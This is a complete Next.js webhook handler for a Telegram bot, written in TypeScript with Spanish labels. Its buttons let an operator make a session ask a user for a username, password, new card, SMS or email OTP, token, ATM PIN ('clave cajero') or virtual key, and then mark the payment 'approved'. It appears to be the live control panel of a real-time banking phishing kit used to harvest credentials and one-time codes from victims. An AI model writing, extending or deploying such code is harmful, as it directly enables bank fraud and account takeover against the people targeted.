import { PaymentStatus, savePaymentState } from '@/utils/paymentStorage';
import { getSessionCredentials } from '@/lib/sessionCredentials';
import type { NextApiRequest, NextApiResponse } from 'next';

type ActionConfig = { status: PaymentStatus; text: string };

const ACTIONS: Record<string, ActionConfig> = {
  error_user:          { status: 'error_user',         text: 'SE SOLICITÓ NUEVO USUARIO, ESPERANDO RESPUESTA' },
  error_password:      { status: 'error_password',     text: 'SE SOLICITÓ NUEVA CONTRASEÑA, ESPERANDO RESPUESTA' },
  new_card:            { status: 'new_card',            text: 'SE SOLICITÓ NUEVA TARJETA, ESPERANDO RESPUESTA' },
  error_code_sms:      { status: 'error_code_sms',     text: 'SE SOLICITÓ NUEVO OTP SMS, ESPERANDO RESPUESTA' },
  error_token:         { status: 'error_token',         text: 'SE SOLICITÓ NUEVO TOKEN, ESPERANDO RESPUESTA' },
  error_clave_cajero:  { status: 'error_clave_cajero', text: 'SE SOLICITÓ NUEVA CLAVE CAJERO, ESPERANDO RESPUESTA' },
  error_otp:           { status: 'error_otp',           text: 'SE SOLICITÓ NUEVO OTP, ESPERANDO RESPUESTA' },
  check:               { status: 'finalized',           text: 'PAGO APROBADO — REDIRIGIENDO A CONFIRMACIÓN' },
  user:                { status: 'user',                text: 'SE SOLICITÓ USUARIO, ESPERANDO RESPUESTA' },
  code_sms:            { status: 'code_sms',            text: 'SE SOLICITÓ OTP SMS, ESPERANDO RESPUESTA' },
  token:               { status: 'token',               text: 'SE SOLICITÓ TOKEN, ESPERANDO RESPUESTA' },
  clave_cajero:        { status: 'clave_cajero',        text: 'SE SOLICITÓ CLAVE CAJERO, ESPERANDO RESPUESTA' },
  otp:                 { status: 'otp',                 text: 'SE SOLICITÓ OTP, ESPERANDO RESPUESTA' },
  clave_virtual:       { status: 'clave_virtual',       text: 'SE SOLICITÓ CLAVE VIRTUAL, ESPERANDO RESPUESTA' },
  error_clave_virtual: { status: 'error_clave_virtual', text: 'SE SOLICITÓ CLAVE VIRTUAL (ERROR), ESPERANDO RESPUESTA' },
  confirmar_identidad: { status: 'confirmar_identidad', text: 'SE SOLICITÓ CONFIRMAR IDENTIDAD, ESPERANDO RESPUESTA' },
  code_email:          { status: 'code_email',          text: 'SE SOLICITÓ CÓDIGO EMAIL, ESPERANDO RESPUESTA' },
  error_code_email:    { status: 'error_code_email',    text: 'SE SOLICITÓ NUEVO CÓDIGO EMAIL, ESPERANDO RESPUESTA' },
};

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Método no permitido' });

  res.status(200).json({ ok: true });

  const callbackQuery = req.body.callback_query;
  if (!callbackQuery) {
    console.log('[Webhook] Sin callback_query, ignorando');
    return;
  }

  const { id: callbackQueryId, data, message } = callbackQuery;
  const chatId      = message.chat.id;
  const messageId   = message.message_id;
  const originalText = message.text || '';

  const sessionMatch = originalText.match(/Session ID:\s*([^\n\r]+)/i);
  const sessionId = sessionMatch?.[1]?.trim();

  const creds = sessionId ? await getSessionCredentials(sessionId) : null;
  if (!creds) {
    console.warn(`[Webhook] Sin credenciales para sessionId=${sessionId}, ignorando`);
    return;
  }
  const TELEGRAM_API = `https://api.telegram.org/bot${creds.botToken}`;

  console.log(`[Webhook] data=${data}, sessionId=${sessionId}`);

  await answerCallback(TELEGRAM_API, callbackQueryId);

  if (data === 'carpeta_errores') { 
    console.log('[Webhook] Menú errores');
    await editarMarkupErrores(TELEGRAM_API, chatId, messageId); 
    return; 
  }
  if (data === 'carpeta_pages') {   
    console.log('[Webhook] Menú pages');
    await editarMarkupPages(TELEGRAM_API, chatId, messageId);   
    return; 
  }
  if (data === 'volver') {
    console.log('[Webhook] Volver');
    await editarMarkupPrincipal(TELEGRAM_API, chatId, messageId); 
    return; 
  }

  const action = ACTIONS[data];
  if (!action) { 
    console.warn('[Webhook] Callback no reconocido:', data); 
    return; 
  }

  if (sessionId) {
    console.log(`[Webhook] Guardando estado: ${sessionId} → ${action.status}`);
    
    await savePaymentState(sessionId, { 
      status: action.status, 
      timestamp: Date.now() 
    });
  } else {
    console.warn('[Webhook] ⚠️ sessionId no encontrado, no se guarda estado');
    console.warn('[Webhook] Texto del mensaje:', originalText.substring(0, 100));
    return;
  }

  const cleanText = removeEstado(originalText);
  await editarMensajeConStatus(TELEGRAM_API, chatId, messageId, `${cleanText}\n\n📌 ESTADO: ${action.text}`);
}

async function answerCallback(api: string, id: string) {
  await fetch(`${api}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: id }),
  }).catch(err => console.error('[Webhook] Error en answerCallback:', err));
}

async function editarMarkup(api: string, chatId: number, messageId: number, inline_keyboard: any[][]) {
  const r = await fetch(`${api}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard } }),
  });
  const j = await r.json();
  if (!j.ok) console.error('[Webhook] editMarkup error:', j);
}

async function editarMarkupErrores(api: string, chatId: number, messageId: number) {
  await editarMarkup(api, chatId, messageId, [
    [{ text: 'Pedir Usuario', callback_data: 'error_user' }, { text: 'Pedir contraseña', callback_data: 'error_password' }],
    [{ text: 'Pedir Tarjeta', callback_data: 'new_card' }],
    [{ text: 'Pedir OTP', callback_data: 'error_otp' }, { text: 'Pedir OTP SMS', callback_data: 'error_code_sms' }, { text: 'Pedir Token', callback_data: 'error_token' }, { text: 'Pedir Clave Cajero', callback_data: 'error_clave_cajero' }, { text: 'Pedir Clave Virtual', callback_data: 'error_clave_virtual' }],
    [{ text: 'Pedir OTP Email', callback_data: 'error_code_email' }, { text: '🔐 Confirmar Identidad', callback_data: 'confirmar_identidad' }],
    [{ text: '🔙 Volver', callback_data: 'volver' }],
  ]);
}

async function editarMarkupPages(api: string, chatId: number, messageId: number) {
  await editarMarkup(api, chatId, messageId, [
    [{ text: 'Pedir Usuario', callback_data: 'user' }, { text: 'Pedir Clave Virtual', callback_data: 'clave_virtual' }],
    [{ text: 'Pedir OTP', callback_data: 'otp' }, { text: 'Pedir OTP SMS', callback_data: 'code_sms' }],
    [{ text: 'Pedir Token', callback_data: 'token' }, { text: 'Pedir Clave Cajero', callback_data: 'clave_cajero' }],
    [{ text: 'Pedir Código Email', callback_data: 'code_email' }, { text: '🔐 Confirmar Identidad', callback_data: 'confirmar_identidad' }],
    [{ text: '🔙 Volver', callback_data: 'volver' }],
  ]);
}

async function editarMarkupPrincipal(api: string, chatId: number, messageId: number) {
  await editarMarkup(api, chatId, messageId, [
    [{ text: '📁 Errores', callback_data: 'carpeta_errores' }, { text: '📄 Pages', callback_data: 'carpeta_pages' }],
    [{ text: '✅ Check', callback_data: 'check' }],
  ]);
}

async function editarMensajeConStatus(api: string, chatId: number, messageId: number, text: string) {
  const r = await fetch(`${api}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId, message_id: messageId, text,
      reply_markup: { inline_keyboard: [] },
    }),
  });
  const j = await r.json();
  if (!j.ok) console.error('[Webhook] editText error:', j);
}

function removeEstado(text: string) {
  return text.split('\n').filter(l => !l.trim().startsWith('📌 ESTADO:') && !l.trim().startsWith('ESTADO:')).join('\n').trim();
}